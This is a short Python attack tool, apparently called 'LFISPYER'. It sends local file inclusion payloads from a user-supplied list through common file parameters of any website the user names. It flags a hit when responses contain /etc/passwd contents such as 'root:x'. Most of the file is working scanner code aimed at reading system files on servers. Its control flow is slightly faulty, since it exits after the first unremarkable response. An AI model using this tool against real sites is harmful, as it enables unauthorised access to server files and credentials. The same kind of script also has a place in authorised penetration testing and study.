import requests
import time
from colorama import init, Fore, Back, Style


# Load payloads

print(r'''
         


 ▄█          ▄████████  ▄█     ▄████████    ▄███████▄ ▄██   ▄      ▄████████    ▄████████
███         ███    ███ ███    ███    ███   ███    ███ ███   ██▄   ███    ███   ███    ███
███         ███    █▀  ███▌   ███    █▀    ███    ███ ███▄▄▄███   ███    █▀    ███    ███
███        ▄███▄▄▄     ███▌   ███          ███    ███ ▀▀▀▀▀▀███  ▄███▄▄▄      ▄███▄▄▄▄██▀
███       ▀▀███▀▀▀     ███▌ ▀███████████ ▀█████████▀  ▄██   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀  
███         ███        ███           ███   ███        ███   ███   ███    █▄  ▀███████████
███▌    ▄   ███        ███     ▄█    ███   ███        ███   ███   ███    ███   ███    ███
█████▄▄██   ███        █▀    ▄████████▀   ▄████▀       ▀█████▀    ██████████   ███    ███
▀                                                                              ███    ███




''')
time.sleep(1)
#input
a = input("Enter Targeted Website: ").strip()

e = input("Do You Have Specific Payload? (No for Default): ")

if e:
    payloads = [e]
else:
    with open("payloads.txt", "r") as f:
        payloads = [line.strip() for line in f if line.strip()]

# Parameters
param_names = ["filename", "viewpage", "page", "file", "viewfile"]

#loop
for payload in payloads:
    for param in param_names:
        try:
            # request
            response = requests.get(a, timeout=5, params={param: payload})

            print(f"[i] param: {param}")
            print(f"[i] payload: {payload}")
            print(f"[i] status: {response.status_code}")

            # detection logic
            if "root:x" in response.text:
                print(Fore.GREEN + "[!!] Possible LFI here! Stopping.")
                exit(0)
            elif "admin" in response.text or "localhost" in response.text:
                print(Fore.YELLOW + "[!] Need attention")
            elif "daemon:x" in response.text:
                print(Fore.YELLOW + "[!] Need attention")
            elif ":/bin/bash" in response.text:
                print(Fore.YELLOW + "[!] Need Attention")
            else:
                print(Fore.BLUE + '    Response length:', len(response.text))
                exit(0)

            print("-" * 60)
        except requests.RequestException as e:
            print(Fore.RED + "[!!] Error while sending request:", str(e))

